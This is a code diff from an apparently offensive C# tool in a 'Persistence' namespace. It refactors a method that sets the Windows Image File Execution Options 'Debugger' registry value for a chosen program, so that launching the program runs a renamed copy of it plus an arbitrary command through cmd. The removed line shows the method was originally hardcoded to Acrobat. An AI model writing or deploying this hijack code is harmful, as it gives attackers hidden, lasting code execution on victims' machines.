@@ -55,7 +55,8 @@ namespace Persistence
         public void ExecProgAndCommand(string programName, string commandToExecute)
         {
             var pathToFile = Utils.FindFile(programName);
-            var newPathToFile = Path.Combine(pathToFile.Replace(Path.GetFileName(pathToFile), String.Empty), "_" + Path.GetFileName(pathToFile));
+            var newName = "_" + Path.GetFileName(pathToFile);
+            var newPathToFile = Path.Combine(pathToFile.Replace(Path.GetFileName(pathToFile), String.Empty), newName);
 
             if (File.Exists(newPathToFile))
                 File.Delete(newPathToFile);
@@ -65,7 +66,7 @@ namespace Persistence
             var subkey = registryKey.OpenSubKey(@$"Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\{programName}",
                                           true);
             ArgumentNullException.ThrowIfNull(subkey);
-            subkey.SetValue("Debugger", @$"cmd /C _Acrobat.exe & {commandToExecute}", RegistryValueKind.String);
+            subkey.SetValue("Debugger", @$"cmd /C {newName} & {commandToExecute}", RegistryValueKind.String);
 
             // subkey.DeleteValue("Debugger");
         }
